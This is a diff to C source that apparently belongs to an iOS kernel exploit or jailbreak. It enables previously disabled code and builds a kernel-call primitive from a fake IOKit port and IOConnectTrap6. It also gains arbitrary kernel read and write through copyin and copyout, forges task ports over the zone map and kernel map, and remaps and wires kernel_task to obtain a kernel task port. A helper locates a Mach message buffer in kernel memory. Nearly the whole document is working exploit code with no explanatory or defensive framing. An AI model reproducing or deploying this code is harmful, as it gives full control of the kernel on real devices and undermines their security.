@@ -1,12 +1,107 @@
 #include <stdint.h>
 #include <stdarg.h>
-
-#if 0
+#include <stddef.h>
+#include <stdbool.h>
 
 typedef uint64_t kptr_t;
 typedef int kern_return_t;
-typedef uint64_t size_t;
 typedef uint32_t mach_port_t;
+typedef mach_port_t * mach_port_array_t;
+typedef int vm_prot_t;
+typedef uint64_t mach_vm_address_t;
+typedef unsigned int mach_msg_type_number_t;
+typedef uint32_t io_connect_t;
+typedef uint32_t mach_port_name_t;
+typedef void * task_t;
+typedef mach_port_t vm_map_t;
+typedef uint64_t mach_vm_size_t;
+typedef uint64_t mach_msg_timeout_t;
+typedef uint64_t mach_msg_size_t;
+typedef uint32_t mach_msg_option_t;
+typedef uint64_t mach_msg_return_t;
+typedef uint64_t mach_vm_offset_t;
+typedef uint32_t mach_port_right_t;
+typedef bool boolean_t;
+typedef void * ipc_space_t;
+typedef unsigned int vm_inherit_t;
+typedef uint64_t mach_port_poly_t; // ???
+typedef uint32_t mach_msg_type_name_t; 
+typedef struct
+{
+	unsigned int msgh_bits;
+	unsigned int msgh_size;
+	unsigned int msgh_remote_port;
+	unsigned int msgh_local_port;
+	unsigned int msgh_reserved;
+	int msgh_id;
+} mach_msg_header_t;
+typedef struct {
+    struct {
+        kptr_t kernel_image_base;
+    } constant;
+
+    struct {
+        kptr_t copyin;
+        kptr_t copyout;
+        kptr_t current_task;
+        kptr_t get_bsdtask_info;
+        kptr_t vm_map_wire_external;
+        kptr_t vfs_context_current;
+        kptr_t vnode_lookup;
+        kptr_t osunserializexml;
+        kptr_t smalloc;
+
+        kptr_t ipc_port_alloc_special;
+        kptr_t ipc_kobject_set;
+        kptr_t ipc_port_make_send;
+    } funcs;
+
+    struct {
+        kptr_t add_x0_x0_ret;
+    } gadgets;
+
+    struct {
+        kptr_t realhost;
+        kptr_t zone_map;
+        kptr_t kernel_task;
+        kptr_t kern_proc;
+        kptr_t rootvnode;
+        kptr_t osboolean_true;
+        kptr_t trust_cache;
+    } data;
+
+    struct {
+        kptr_t iosurface_root_userclient;
+    } vtabs;
+
+    struct {
+        uint32_t is_task_offset;
+        uint32_t task_itk_self;
+        uint32_t itk_registered;
+        uint32_t ipr_size;
+        uint32_t sizeof_task;
+    } struct_offsets;
+
+    struct {
+        uint32_t create_outsize;
+        uint32_t create_surface;
+        uint32_t set_value;
+    } iosurface;
+
+	struct {
+		void (*write) (int fd,void * buf,uint64_t size);
+		kern_return_t (*IOConnectTrap6) (io_connect_t connect,uint32_t selector, uint64_t arg1,uint64_t arg2,uint64_t arg3,uint64_t arg4,uint64_t arg5,uint64_t arg6);
+		kern_return_t (*mach_ports_lookup) (task_t target_task,mach_port_array_t init_port_set,mach_msg_type_number_t init_port_count);
+		mach_port_name_t (*mach_task_self) ();
+		kern_return_t (*mach_vm_remap) (vm_map_t target_task, mach_vm_address_t *target_address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src_task, mach_vm_address_t src_address, boolean_t copy, vm_prot_t *cur_protection, vm_prot_t *max_protection, vm_inherit_t inheritance);
+		kern_return_t (*mach_port_destroy) (ipc_space_t task,mach_port_name_t name);
+		kern_return_t (*mach_port_deallocate) (ipc_space_t task,mach_port_name_t name);
+		kern_return_t (*mach_port_allocate) (ipc_space_t task,mach_port_right_t right,mach_port_name_t *name);
+		kern_return_t (*mach_port_insert_right) (ipc_space_t task,mach_port_name_t name,mach_port_poly_t right,mach_msg_type_name_t right_type);
+		kern_return_t (*mach_ports_register) (task_t target_task,mach_port_array_t init_port_set,uint64_t /*???target_task*/ init_port_array_count);
+		mach_msg_return_t (*mach_msg) (mach_msg_header_t * msg,mach_msg_option_t option,mach_msg_size_t send_size,mach_msg_size_t receive_limit,mach_port_t receive_name,mach_msg_timeout_t timeout,mach_port_t notify);
+	} userland_funcs;
+} offsets_t;
 
 typedef volatile struct {
     uint32_t ip_bits;
@@ -53,6 +148,29 @@ typedef volatile struct {
     uint32_t ip_srights;
     uint32_t ip_sorights;
 } kport_t;
+typedef volatile union
+{
+    struct {
+        struct {
+            kptr_t data;
+            uint32_t reserved : 24,
+            type     :  8;
+            uint32_t pad;
+        } lock; // mutex lock
+        uint32_t ref_count;
+        uint32_t active;
+        uint32_t halting;
+        uint32_t pad;
+        kptr_t map;
+    } a;
+} ktask_t;
+typedef struct
+{
+    mach_msg_header_t head;
+    uint64_t verification_key;
+    char data[0];
+    char padding[4];
+} mach_msg_data_buffer_t;
 
 #define LOG(str, args...) do { } while(0)
 #define KERN_INVALID_ARGUMENT 2
@@ -72,8 +190,24 @@ typedef volatile struct {
 #define VM_PROT_READ 0x1
 #define VM_PROT_WRITE 0x2
 #define VM_PROT_EXECUTE 0x3
+#define VM_FLAGS_ANYWHERE 0x0001
+#define VM_FLAGS_RETURN_DATA_ADDR 0x100000
+#define VM_INHERIT_NONE 2
 
-void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t kslide,uint64_t the_one,void *(*write) (int fd,void * buf,uint64_t size)) {
+#define MACH_PORT_NULL 0
+#define MACH_PORT_DEAD ((uint32_t) ~0)
+#define MACH_PORT_VALID(x) (((x) != MACH_PORT_NULL) && ((x) != MACH_PORT_DEAD))
+#define MACH_MSG_TYPE_MAKE_SEND 20
+#define MACH_PORT_RIGHT_RECEIVE 1
+#define MACH_SEND_MSG 1
+#define MACH_MSGH_BITS(remote, local) ((remote) | ((local) << 8))
+
+
+uint64_t send_buffer_to_kernel_and_find(offsets_t *  offs, uint64_t (^read64)(uint64_t addr), uint64_t our_task_addr, mach_msg_data_buffer_t *buffer_msg, size_t msg_size);
+
+void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobject_client_port_addr,uint64_t our_task_addr,uint64_t kslide,uint64_t the_one,offsets_t * offsets,void *(*write) (int fd,void * buf,uint64_t size)) {
+    mach_port_array_t maps = NULL;
+    mach_msg_type_number_t maps_num = 0;
 	kern_return_t ret;
 	kern_return_t (^kcall)(uint64_t, int, ...);
 	uint64_t (^zonemap_fix_addr)(uint64_t);
@@ -119,14 +253,14 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t kslide,u
             return 0x0;
         }
 
-        return IOConnectTrap6(the_one, 0, args[1], args[2], args[3], args[4], args[5], args[6]);
+        return offsets->userland_funcs.IOConnectTrap6(the_one, 0, args[1], args[2], args[3], args[4], args[5], args[6]);
     };
 
     /*  once we have an execution primitive we can use copyin/copyout funcs to freely read/write kernel mem  */
 
     kreadbuf = ^(uint64_t addr, void *buf, size_t len)
     {
-        kcall(offsets.funcs.copyout, 3, addr, buf, len);
+        kcall(offsets->funcs.copyout, 3, addr, buf, len);
     };
 
     kread32 = ^(uint64_t addr)
@@ -145,7 +279,7 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t kslide,u
 
     kwritebuf = ^(uint64_t addr, void *buf, size_t len)
     {
-        kcall(offsets.funcs.copyin, 3, buf, addr, len);
+        kcall(offsets->funcs.copyin, 3, buf, addr, len);
     };
 
     kwrite32 = ^(uint64_t addr, uint32_t val)
@@ -158,7 +292,7 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t kslide,u
         kwritebuf(addr, &val, sizeof(val));
     };
 
-    uint64_t zone_map_addr = kread64(offsets.data.zone_map + kslide);
+    uint64_t zone_map_addr = kread64(offsets->data.zone_map + kslide);
     if (zone_map_addr == 0x0)
     {
         LOG("failed to get zone map addr");
@@ -193,7 +327,7 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t kslide,u
         ret = KERN_FAILURE;
         goto out;
     }
-	uint64_t kern_task_addr = kread64(offsets.data.kernel_task + kslide);
+	uint64_t kern_task_addr = kread64(offsets->data.kernel_task + kslide);
     if (kern_task_addr == 0x0)
     {
         LOG("failed to read kern_task_addr!");
@@ -202,7 +336,7 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t kslide,u
     }
     LOG("[+] kern_task_addr: %llx", kern_task_addr);
 
-    uint64_t kern_proc = zonemap_fix_addr(kcall(offsets.funcs.get_bsdtask_info, 1, kern_task_addr));
+    uint64_t kern_proc = zonemap_fix_addr(kcall(offsets->funcs.get_bsdtask_info, 1, kern_task_addr));
     if (kern_proc == 0x0)
     {
         LOG("failed to read kern_proc!");
@@ -211,7 +345,7 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t kslide,u
     }
     LOG("[+] got kernproc: %llx", kern_proc);;
 
-    uint64_t curr_task = zonemap_fix_addr(kcall(offsets.funcs.current_task, 0));
+    uint64_t curr_task = zonemap_fix_addr(kcall(offsets->funcs.current_task, 0));
     if (curr_task == 0x0)
     {
         LOG("failed to get curr_task!");
@@ -240,18 +374,36 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t kslide,u
     LOG("ipc_space_kernel: %llx", ipc_space_kernel);
 
     uint64_t ptrs[2] = { 0 };
-    ptrs[0] = zonemap_fix_addr(kcall(offsets.funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
-    ptrs[1] = zonemap_fix_addr(kcall(offsets.funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
+    ptrs[0] = zonemap_fix_addr(kcall(offsets->funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
+    ptrs[1] = zonemap_fix_addr(kcall(offsets->funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
     LOG("zm_port addr: %llx", ptrs[0]);
     LOG("km_port addr: %llx", ptrs[1]);
 
-    size_t ktask_size = offsets.struct_offsets.sizeof_task;
+    size_t ktask_size = offsets->struct_offsets.sizeof_task;
 
-    mach_msg_data_buffer_t *zm_task_buf_msg = (mach_msg_data_buffer_t *)malloc(ktask_size);
-    bzero(zm_task_buf_msg, ktask_size);
+	char scratch_space[2048];
+	if (ktask_size > 1024) {
+		LOG("Buffer to small");
+		ret = KERN_FAILURE;
+		goto out;
+	}
+    mach_msg_data_buffer_t * zm_task_buf_msg = (mach_msg_data_buffer_t *)&scratch_space;
+    for (int i = 0; i < ktask_size; i++) {
+		scratch_space[i] = 0x0;
+	}
 
     zm_task_buf_msg->verification_key = 0x4242424243434343;
 
+    ktask_t *zm_task_buf = (ktask_t *)(&zm_task_buf_msg->data[0]);
+
+    zm_task_buf->a.lock.data = 0x0;
+    zm_task_buf->a.lock.type = 0x22;
+    zm_task_buf->a.ref_count = 100;
+    zm_task_buf->a.active = 1;
+    *(kptr_t *)((uint64_t)zm_task_buf + offsets->struct_offsets.task_itk_self) = 1;
+    zm_task_buf->a.map = zone_map_addr;
+
+	mach_msg_data_buffer_t * km_task_buf_msg = (mach_msg_data_buffer_t *)(((uint64_t)&scratch_space) + 1024);
 	ktask_t *km_task_buf = (ktask_t *)(&km_task_buf_msg->data[0]);
     km_task_buf->a.map = kernel_vm_map;
 
@@ -274,15 +426,14 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t kslide,u
 
     LOG("km_task_buf_addr: %llx", km_task_buf_addr);
 
-    kcall(offsets.funcs.ipc_kobject_set, 3, ptrs[0], (uint64_t)zm_task_buf, IKOT_TASK);
-    kcall(offsets.funcs.ipc_kobject_set, 3, ptrs[1], (uint64_t)km_task_buf, IKOT_TASK);
+    kcall(offsets->funcs.ipc_kobject_set, 3, ptrs[0], (uint64_t)zm_task_buf, IKOT_TASK);
+    kcall(offsets->funcs.ipc_kobject_set, 3, ptrs[1], (uint64_t)km_task_buf, IKOT_TASK);
 
-    kwrite64(curr_task + offsets.struct_offsets.itk_registered + 0x0, ptrs[0]);
-    kwrite64(curr_task + offsets.struct_offsets.itk_registered + 0x8, ptrs[1]);
+    kwrite64(curr_task + offsets->struct_offsets.itk_registered + 0x0, ptrs[0]);
+    kwrite64(curr_task + offsets->struct_offsets.itk_registered + 0x8, ptrs[1]);
 
-    usleep(50000);
 
-    ret = mach_ports_lookup(mach_task_self(), &maps, &maps_num);
+    ret = offsets->userland_funcs.mach_ports_lookup(offsets->userland_funcs.mach_task_self(), &maps, &maps_num);
     if (ret != KERN_SUCCESS)
     {
         LOG("failed to lookup mach ports: %x (%s)", ret, mach_error_string(ret));
@@ -303,14 +454,14 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t kslide,u
 
     ptrs[0] = ptrs[1] = 0x0;
 
-    kwrite64(curr_task + offsets.struct_offsets.itk_registered + 0x0, 0x0);
-    kwrite64(curr_task + offsets.struct_offsets.itk_registered + 0x8, 0x0);
+    kwrite64(curr_task + offsets->struct_offsets.itk_registered + 0x0, 0x0);
+    kwrite64(curr_task + offsets->struct_offsets.itk_registered + 0x8, 0x0);
 
     LOG("kern_task_addr: %llx", kern_task_addr);
 
 	mach_vm_address_t remap_addr = 0x0;
     vm_prot_t cur = 0x0, max = 0x0;
-    ret = mach_vm_remap(maps[1], &remap_addr, offsets.struct_offsets.sizeof_task, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, maps[0], kern_task_addr, false, &cur, &max, VM_INHERIT_NONE);
+    ret = offsets->userland_funcs.mach_vm_remap(maps[1], &remap_addr, offsets->struct_offsets.sizeof_task, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, maps[0], kern_task_addr, false, &cur, &max, VM_INHERIT_NONE);
     if (ret != KERN_SUCCESS)
     {
         LOG("mach_vm_remap failed: %x (%s)", ret, mach_error_string(ret));
@@ -320,17 +471,16 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t kslide,u
 
     LOG("[+] remap addr: %llx", remap_addr);
 
-    usleep(500000);
 
-    mach_port_destroy(mach_task_self(), maps[0]);
-    mach_port_destroy(mach_task_self(), maps[1]);
+    offsets->userland_funcs.mach_port_destroy(offsets->userland_funcs.mach_task_self(), maps[0]);
+    offsets->userland_funcs.mach_port_destroy(offsets->userland_funcs.mach_task_self(), maps[1]);
 
     // remap must cover the entire struct and be page aligned 
     uint64_t remap_start = remap_addr & ~(pgsize - 1);
-    uint64_t remap_end = (remap_addr + offsets.struct_offsets.sizeof_task + pgsize) & ~(pgsize - 1);
+    uint64_t remap_end = (remap_addr + offsets->struct_offsets.sizeof_task + pgsize) & ~(pgsize - 1);
 
     // kern_return_t vm_map_wire_external(vm_map_t map, vm_map_offset_t start, vm_map_offset_t end, vm_prot_t caller_prot, boolean_t user_wire)
-    ret = kcall(offsets.funcs.vm_map_wire_external, 5, kernel_vm_map, remap_start, remap_end, VM_PROT_READ | VM_PROT_WRITE, false);
+    ret = kcall(offsets->funcs.vm_map_wire_external, 5, kernel_vm_map, remap_start, remap_end, VM_PROT_READ | VM_PROT_WRITE, false);
     if (ret != KERN_SUCCESS)
     {
         LOG("failed to kcall vm_map_wire_external: %x (%s)", ret, mach_error_string(ret));
@@ -338,15 +488,14 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t kslide,u
         goto out;
     }
 
-    uint64_t new_port = zonemap_fix_addr(kcall(offsets.funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
+    uint64_t new_port = zonemap_fix_addr(kcall(offsets->funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
     LOG("new_port: %llx", new_port);
 
-    usleep(500000);
 
-    kcall(offsets.funcs.ipc_kobject_set, 3, new_port, remap_addr, IKOT_TASK);
-    kcall(offsets.funcs.ipc_port_make_send, 1, new_port);
+    kcall(offsets->funcs.ipc_kobject_set, 3, new_port, remap_addr, IKOT_TASK);
+    kcall(offsets->funcs.ipc_port_make_send, 1, new_port);
 
-    uint64_t realhost = offsets.data.realhost + kslide;
+    uint64_t realhost = offsets->data.realhost + kslide;
     LOG("[!] realhost: %llx", realhost);
 
 // realhost->special[4]
@@ -356,13 +505,13 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t kslide,u
     // zero out old ports before overwriting
     for (int i = 0; i < 3; i++)
     {
-        kwrite64(curr_task + offsets.struct_offsets.itk_registered + (i * 0x8), 0x0);
+        kwrite64(curr_task + offsets->struct_offsets.itk_registered + (i * 0x8), 0x0);
     }
 
-    kwrite64(curr_task + offsets.struct_offsets.itk_registered, new_port);
+    kwrite64(curr_task + offsets->struct_offsets.itk_registered, new_port);
     LOG("wrote new port: %llx", new_port);
 
-    ret = mach_ports_lookup(mach_task_self(), &maps, &maps_num);
+    ret = offsets->userland_funcs.mach_ports_lookup(offsets->userland_funcs.mach_task_self(), &maps, &maps_num);
 
 //    kwrite64(curr_task + ITK_REGISTERED_OFFSET, 0x0);
 
@@ -385,7 +534,106 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t kslide,u
 out:
 	fakeport->ip_bits = 0x0;
     fakeport->ip_kobject = 0x0;
-	mach_port_deallocate(mach_task_self(), the_one);
+	offsets->userland_funcs.mach_port_deallocate(offsets->userland_funcs.mach_task_self(), the_one);
 }
 
-#endif 
+// kinda messy function signature
+uint64_t send_buffer_to_kernel_and_find(offsets_t * offs, uint64_t (^read64)(uint64_t addr), uint64_t our_task_addr, mach_msg_data_buffer_t *buffer_msg, size_t msg_size)
+{
+    kern_return_t ret;
+
+    buffer_msg->head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
+    buffer_msg->head.msgh_local_port = MACH_PORT_NULL;
+    buffer_msg->head.msgh_size = msg_size;
+
+    mach_port_t port;
+    ret = offs->userland_funcs.mach_port_allocate(offs->userland_funcs.mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
+    if (ret != KERN_SUCCESS)
+    {
+        LOG("failed to allocate mach port: %x", ret);
+        goto err;
+    }
+
+    LOG("got port: %x", port);
+
+    ret = offs->userland_funcs.mach_port_insert_right(offs->userland_funcs.mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+    if (ret != KERN_SUCCESS)
+    {
+        LOG("failed ot insert send right: %x", ret);
+        goto err;
+    }
+
+    ret = offs->userland_funcs.mach_ports_register(offs->userland_funcs.mach_task_self(), &port, 1);
+    if (ret != KERN_SUCCESS)
+    {
+        LOG("failed to register mach port: %x", ret);
+        goto err;
+    }
+
+    buffer_msg->head.msgh_remote_port = port;
+
+    ret = offs->userland_funcs.mach_msg(&buffer_msg->head, MACH_SEND_MSG, buffer_msg->head.msgh_size, 0, 0, 0, 0);
+    if (ret != KERN_SUCCESS)
+    {
+        LOG("failed to send mach message: %x (%s)", ret, mach_error_string(ret));
+        goto err;
+    }
+
+    uint64_t itk_registered = read64(our_task_addr + offs->struct_offsets.itk_registered);
+    if (itk_registered == 0x0)
+    {
+        LOG("failed to read our_task_addr->itk_registered!");
+        goto err;
+    }
+
+    LOG("itk_registered: %llx", itk_registered);
+
+    uint16_t msg_count = read64(itk_registered + offsetof(kport_t, ip_messages.port.msgcount)) & 0xffff;
+    if (msg_count != 1)
+    {
+        LOG("got weird msgcount! expected 1 but got: %x", msg_count);
+        goto err;
+    }
+
+    LOG("msg_count: %d", msg_count);
+    uint64_t messages = read64(itk_registered + offsetof(kport_t, ip_messages.port.messages));
+    if (messages == 0x0)
+    {
+        LOG("unable to find ip_messages.port.messages in kernel port!");
+        goto err;
+    }
+
+    LOG("messages: %llx", messages);
+
+    uint64_t header = read64(messages + 0x18); // ipc_kmsg->ikm_header
+    if (header == 0x0)
+    {
+        LOG("unable to find ipc_kmsg->ikm_header");
+        goto err;
+    }
+
+    LOG("header: %llx", header);
+
+    uint64_t key_address = header + 0x20; // ikm_header->verification_key (in the msg body)
+
+    LOG("key_address: %llx", key_address);
+
+    uint64_t kernel_key = read64(key_address);
+    if (kernel_key != buffer_msg->verification_key)
+    {
+        LOG("kernel verification key did not match! found wrong kmsg? expected: %llx, got: %llx", buffer_msg->verification_key, kernel_key);
+        goto err;
+    }
+
+    ret = offs->userland_funcs.mach_ports_register(offs->userland_funcs.mach_task_self(), NULL, 0);
+    if (ret != KERN_SUCCESS)
+    {
+        LOG("failed to call mach_ports_register: %x", ret);
+        goto err;
+    }
+
+    return key_address + sizeof(kernel_key);
+
+err:
+    return 0x0;
+}
